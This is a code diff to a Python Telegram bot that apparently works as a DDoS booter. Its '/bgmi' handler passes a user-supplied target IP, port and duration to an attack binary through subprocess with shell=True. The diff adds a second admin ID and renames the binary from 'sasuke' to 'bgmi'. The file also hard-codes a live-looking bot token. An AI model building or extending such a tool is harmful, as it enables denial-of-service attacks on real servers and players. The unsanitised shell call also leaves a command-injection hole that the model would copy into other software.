@@ -10,7 +10,7 @@ import os
 bot = telebot.TeleBot('7492176838:AAHOaYdlS7ihnsBFKygcBkGFamXxCfNKqOI')
 
 # Admin user IDs
-admin_id = ["1383324178"]
+admin_id = ["1383324178","948895728"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -320,7 +320,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./sasuke {target} {port} {time}"
+                full_command = f"./bgmi {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
